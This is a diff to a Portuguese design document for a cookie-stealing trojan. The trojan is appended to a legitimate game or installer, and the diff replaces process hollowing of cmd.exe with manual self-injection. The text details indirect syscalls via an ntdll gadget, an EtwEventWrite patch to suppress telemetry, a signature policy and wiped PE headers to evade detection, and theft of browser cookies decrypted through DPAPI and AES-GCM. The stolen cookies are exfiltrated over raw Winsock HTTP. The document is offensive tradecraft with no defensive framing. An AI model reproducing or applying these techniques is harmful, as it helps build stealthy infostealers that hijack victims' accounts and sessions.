@@ -16,7 +16,7 @@ FORMATO DO .EXE INFECTADO
 
   [bytes do loader.exe] [bytes do host.exe] [host_len:4 bytes LE] [magic:4 bytes "CKLG"]
 
-  - loader.exe     = o injetor com process hollowing (compilado de loader.cpp)
+  - loader.exe     = o loader com self-injection (compilado de loader.cpp)
                      Contém o payload DLL embutido como byte array g_payload[]
                      (gerado por gen.ps1 a partir de ckdll.dll)
   - host.exe       = o jogo/aplicativo original que o atacante escolheu infectar
@@ -74,52 +74,57 @@ PASSO 3: ABRIR O HOST ORIGINAL (jogo/instalador abre normalmente)
   Nenhuma indicação visível de algo errado.
 
 -------------------------------------------------------------------------------
-PASSO 4: PROCESS HOLLOWING (injeção do payload)
+PASSO 4: SELF-INJECTION (mapeamento do payload)
 -------------------------------------------------------------------------------
 
-  4a. GetSystemDirectoryW -> target = C:\Windows\System32\cmd.exe
-      (processo sacrificial — vamos sobrescrever a memória dele com o payload)
-  4b. CreateProcessW(cmd.exe, CREATE_SUSPENDED | SW_HIDE)
-      -> cmd.exe é criado em estado suspenso, sem janela visível.
-  4c. NtUnmapViewOfSection(hProcess, ImageBase)
-      -> descarta o código original do cmd.exe da memória.
-  4d. VirtualAllocEx(hProcess, 0x5F000000, SizeOfImage, MEM_COMMIT, RW)
-      -> aloca memória no endereço base fixo do payload
-         (DLL compilada com /DYNAMICBASE:NO /BASE:0x5F000000)
-  4e. WriteProcessMemory: escreve os headers PE + todas as seções de g_payload[]
-      no processo sacrificial em 0x5F000000.
-  4f. Corrige a IAT: para cada DLL importada (kernel32, crypt32, bcrypt, ws2_32):
-      - LoadLibraryA(dll) no processo injetor (mesmo endereço base nesta
-        sessão devido ao ASLR por boot)
-      - GetProcAddress para cada função importada
-      - WriteProcessMemory do endereço resolvido na IAT do alvo
-  4g. VirtualProtectEx: define permissões por seção (RX para código, RW para data,
-      sem RWX global).
-  4h. NtCreateThreadEx(hThread, ..., EntryPointer, arg=1,
-                       flag HIDE_FROM_DEBUGGER)
-      -> cria uma nova thread em payload_entry() no processo hollowed.
-      -> HIDE_FROM_DEBUGGER: a thread fica oculta de debuggers.
-      -> arg=1 sinaliza DLL_PROCESS_ATTACH (igual ao LoadLibrary).
-      Fallback: CreateRemoteThread se NtCreateThreadEx não estiver disponível.
+  4a. InitSyscalls(): lê os SSNs de NtAllocateVirtualMemory,
+      NtProtectVirtualMemory e NtCreateThreadEx dos stubs mapeados da ntdll
+      (4C 8B D1 B8 ss ss ss ss), encontra um gadget "syscall; ret" (0F 05 C3)
+      no .text da ntdll e monta três stubs em uma página RX:
+      mov r10,rcx; mov eax,ssn; mov r11,gadget; jmp r11
+      Fallback se algo falhar: exports da kernel32 (a execução continua).
 
-  4i. NÃO fazer ResumeThread na thread principal.
-      O entry point original do cmd.exe foi desmapeado no passo 4c.
-      Resumir causaria access violation, matando o processo inteiro
-      e o payload junto. A thread remota executa independentemente.
+  4b. NtAllocateVirtualMemory(indireta, NtCurrentProcess) na base preferida
+      do payload, 0x5F000000 (MEM_RESERVE|MEM_COMMIT, RW).
+      Se o intervalo estiver ocupado, realoca em outro lugar e aplica .reloc.
+
+  4c. Copia os headers PE e todas as seções de g_payload[] para este processo.
+
+  4d. Resolve a IAT no próprio processo: para cada DLL importada (kernel32,
+      advapi32, crypt32, bcrypt, iphlpapi, secur32), LoadLibraryA +
+      GetProcAddress e grava o endereço no thunk mapeado. Todas são imagens
+      assinadas do System32.
+
+  4e. RtlAddFunctionTable: registra o intervalo .pdata do payload para que uma
+      exceção dentro da imagem mapeada manualmente possa desenrolar a pilha.
+
+  4f. Patch de EtwEventWrite para 33 C0 C3 (xor eax,eax; ret): escritas de
+      evento retornam sucesso sem emitir nada.
+
+  4g. Somente release: SetProcessMitigationPolicy(ProcessSignaturePolicy =
+      MicrosoftSignedOnly). O payload já está mapeado; qualquer imagem carregada
+      depois precisa ser assinada pela Microsoft.
+
+  4h. Sela a imagem: permissões por seção (RX/RW, sem RWX global), zera os
+      headers DOS/NT (sem MZ/PE em 0x5F000000), zera o buffer de staging.
+
+  4i. NtCreateThreadEx(indireta) em payload_entry com arg=1.
+      Fallback: CreateThread. O loader espera essa thread e encerra.
+      Não há processo hospedeiro para resumir ou terminar.
 
 -------------------------------------------------------------------------------
 PASSO 5: EXECUÇÃO DO PAYLOAD (ckdll.cpp: payload_entry)
 -------------------------------------------------------------------------------
 
-  payload_entry() executa no processo cmd.exe hollowed.
+  payload_entry() executa no processo do loader.
 
-  5a. Verifica: reason==1 (LoadLibrary) ou h==1 (arg do CreateRemoteThread).
+  5a. Verifica: reason==1 (LoadLibrary) ou h==1 (arg da thread).
       Se nenhum, retorna (modo de attach errado).
   5b. LoadLibraryA("winsqlite3.dll") -> resolve exports do SQLite via GetProcAddress:
       sqlite3_open_v2, sqlite3_prepare16_v2, sqlite3_step, sqlite3_column_int,
       sqlite3_column_int64, sqlite3_column_blob, sqlite3_column_bytes,
       sqlite3_finalize, sqlite3_close
-  5c. Pré-carrega DLLs de dependência (o processo hollowed não as tem por padrão):
+  5c. Pré-carrega DLLs de dependência (uma imagem mapeada manualmente não tem nenhuma carregada):
       LoadLibraryA("crypt32.dll")   -> para CryptUnprotectData (DPAPI)
       LoadLibraryA("bcrypt.dll")    -> para BCrypt* (AES-256-GCM)
       LoadLibraryA("ws2_32.dll")    -> para Winsock2 (exfiltração HTTP)
@@ -221,7 +226,7 @@ PASSO 8: EXFILTRAÇÃO HTTP (Sink + ExfilHTTP)
 
   Por que Winsock2 e não WinHTTP:
     WinHTTP/WinINet precisam ler a configuração de proxy do Windows, que não
-    está disponível em processo hollowed (erro 12029 / ERROR_WINHTTP_CANNOT_CONNECT).
+    está disponível em um payload mapeado manualmente (erro 12029 / ERROR_WINHTTP_CANNOT_CONNECT).
     Winsock2 puro (socket+connect+send) não tem essa dependência e funciona
     em qualquer contexto de processo.
 
@@ -251,13 +256,13 @@ TIMING
 -------------------------------------------------------------------------------
 
   Passo 1-3 (extrair + abrir host):     ~0.5 segundos
-  Passo 4 (process hollowing):            ~0.5 segundos
+  Passo 4 (mapeamento + syscalls):       <0.1 segundos (sem criar processo)
   Passo 5-7 (extração de cookies):       ~2-5 segundos
   Passo 8 (exfiltração HTTP):            ~1-3 segundos (depende da quantidade)
   Total:                                 ~4-9 segundos
 
-  O loader espera até 20 segundos (wait=20000) pela thread do payload
-  terminar antes de matar o processo cmd.exe sacrificial.
+  O loader espera pela thread do payload sem limite por padrão; -t N limita
+  a espera, após a qual o loader encerra e o payload morre com ele.
 
 -------------------------------------------------------------------------------
 MODO DEBUG
